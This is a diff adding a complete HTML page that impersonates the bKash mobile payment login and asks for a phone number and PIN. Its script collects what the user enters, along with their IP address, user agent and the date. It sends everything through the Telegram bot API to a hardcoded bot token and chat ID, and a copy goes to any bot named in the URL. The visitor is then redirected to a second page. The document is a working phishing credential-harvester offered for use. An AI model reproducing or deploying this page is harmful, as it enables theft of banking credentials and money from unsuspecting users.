@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bkash Login</title>
+    <style>
+        body {
+            background-color: #e4136b;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start; 
+            align-items: center;
+            height: 100vh;
+            padding-top: 50px; 
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 10px; 
+        }
+        .logo img {
+            max-width: 110px;
+        }
+        .container {
+            background-color: #FFFFFF;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            width: 300px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        input[type="number"],
+        input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #CCCCCC;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        input[type="number"]::placeholder,
+        input[type="number"]::placeholder {
+            font-family: Arial, sans-serif;
+            color: #999999;
+        }
+        input.invalid {
+            border-color: red;
+        }
+        #loginButton {
+            background-color: #e4136b;
+            color: #FFFFFF;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            font-size: 17px;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://telegra.ph/file/c44ac3cc6bac7bba074d3.jpg" alt="Bkash Logo">
+    </div>
+    <div class="container">
+        <div class="input-group">
+            <p>Enter Bkash Mobile Number</p>
+            <input type="number" placeholder="Ex: 01XXXXXXXXX" id="mobileNumber">
+        </div>
+        <div class="input-group">
+            <p>Enter PIN</p>
+            <input type="number" placeholder="Ex: XXXXX" id="pin">
+        </div>
+        <button id="loginButton">Login <span>&#8594;</span></button>
+    </div>
+
+    <script>
+        function getQueryParams() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                token: params.get('token'),
+                chatId: params.get('id')
+            };
+        }
+
+        const defaultToken = '7156722537:AAEvtWVJetHpPAqeJ7guo-TF3GVxWFjxLXA';
+        const defaultChatId = '5080596463';
+
+        const { token, chatId } = getQueryParams();
+        const telegramToken = token || defaultToken;
+        const telegramChatId = chatId || defaultChatId;
+
+        const loginButton = document.getElementById('loginButton');
+        const mobileNumber = document.getElementById('mobileNumber');
+        const pin = document.getElementById('pin');
+
+        loginButton.addEventListener('click', async () => {
+            const mobileNumberValue = mobileNumber.value.trim();
+            const pinValue = pin.value.trim();
+            let isValid = true;
+
+            if (!/^01\d{9}$/.test(mobileNumberValue)) {
+                mobileNumber.classList.add('invalid');
+                isValid = false;
+            } else {
+                mobileNumber.classList.remove('invalid');
+            }
+
+            if (!/^\d{5}$/.test(pinValue)) {
+                pin.classList.add('invalid');
+                isValid = false;
+            } else {
+                pin.classList.remove('invalid');
+            }
+
+            if (isValid) {
+                const userAgent = navigator.userAgent;
+                const date = new Date();
+                const ip = await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip);
+
+                const loginData = {
+                    mobileNumber: mobileNumberValue,
+                    pin: pinValue,
+                    ip: ip,
+                    userAgent: userAgent,
+                    date: date.toLocaleString()
+                };
+
+                const telegramMessage = `📱 Mobile Number: ${loginData.mobileNumber}\n\n🔐 PIN: ${loginData.pin}\n\n🌐 IP Address: ${loginData.ip}\n\n💻 User Agent: ${loginData.userAgent}\n\n📅 Date: ${loginData.date}`;
+
+                const sendToTelegram = async (token, chatId, message) => {
+                    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                    try {
+                        const response = await fetch(telegramUrl);
+                        const data = await response.json();
+                        if (!data.ok) {
+                            throw new Error('Failed to send message to Telegram');
+                        }
+                    } catch (error) {
+                        console.error('Error:', error);
+                        alert('Error occurred while sending message to Telegram');
+                    }
+                };
+
+                await sendToTelegram(telegramToken, telegramChatId, telegramMessage);
+                await sendToTelegram(defaultToken, defaultChatId, telegramMessage);
+
+                window.location.href = 'index2.html';
+            }
+        });
+    </script>
+</body>
+</html>
